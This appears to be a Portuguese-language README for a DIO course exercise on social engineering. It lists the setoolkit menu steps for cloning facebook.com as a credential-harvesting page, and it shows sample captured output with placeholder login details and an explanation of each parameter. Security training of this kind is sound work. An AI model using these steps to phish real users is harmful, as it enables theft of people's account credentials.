# Dio-desafio-phishing.
Desafio de projeto sobre Engenharia Social e Phishing no Kali Linux - DIO.

# Phishing para captura de senhas do Facebook no Kali Linux.

--> ** NOTA: ** Laboratório realizado para fins educacionais e de estudo sobre Engenharia Social no ambiente da DIO.

## Ferramentas
*** NOTA IMPORTANTE: ESTOU SEM ESPAÇO NO MEU NOTEBOOK PARA CRIAR UMA VM OU INSTALAT POR WSL***.
* SENDO ASSIM A SIMULAÇÃO NA AULA FOI FEITO O USO DAS SEGUINTES FERRAMENTAS:

* Kali Linux (Sistema Operacional)
* setoolkit
* (O SET (Social-Engineer Toolkit) é uma ferramenta open-source, desenvolvida especificamente para realizar testes de penetração com foco em Engenharia Social.)

  =================================================================

## Configurando o Phishing no Kali Linux
## Dentro do terminal do Kali Linux.

# Acesso root: sudo su
# Iniciando o setoolkit: setoolkit
# Tipo de ataque: Social-Engineering Attacks
# Vetor de ataque: Web Site Attack Vectors
# Método de ataque: Credential Harvester Attack Method
# Método de ataque: Site Cloner
# Obtendo o endereço da máquina: ifconfig
# URL para clone: http://www.facebook.com

=================================================================

## Resultados
## Como explicado eu não tenho espaço na maquina para realizar o teste mas em aula o resultado que aparece 
no prompt é similar a explicação abaixo:

### Output capturado no terminal do 'setoolkit' após a submissão do formulário na página clonada:


[***] POSSIBLE USERNAME FIELD FOUND: fulano@servico.com
[***] POSSIBLE PASSWORD FIELD FOUND: SenhaExemplo123

PARAM: signed_next=
PARAM: trynum=1
PARAM: timezone=180
PARAM: lgndim=eyJjI...
PARAM: lgnrnd=112556_dsDS
PARAM: lgnjs=1668021982
PARAM: prefill_contact_point=
PARAM: prefill_source=
PARAM: prefill_type=
PARAM: first_prefill_source=

🔍 Explicação Técnica dos Parâmetros (PARAM):
POSSIBLE USERNAME / PASSWORD FIELD FOUND: Destaque feito pelo setoolkit ao identificar o nome de usuário (e-mail/telefone) e a senha digitados pela vítima na página clonada.

signed_next: Parâmetro do Facebook que armazena a URL de destino para onde o usuário deve ser redirecionado após o login.

trynum: Contador que indica o número de tentativas de login efetuadas naquela sessão (ex: 1 para a primeira tentativa).

timezone: Deslocamento do fuso horário do navegador da vítima em minutos em relação ao UTC (ex: 180 minutos = UTC-3, horário oficial de Brasília).

lgndim: String codificada em Base64 com informações de telemetria do navegador, como resolução de tela e dimensões da janela.

lgnrnd e lgnjs: Tokens e timestamps em JavaScript gerados pela aplicação original para controle de sessão e prevenção de bots.

prefill_contact_point / prefill_source / prefill_type / first_prefill_source: Parâmetros de rastreamento do Facebook utilizados para identificar a origem do preenchimento automático do formulário de login.
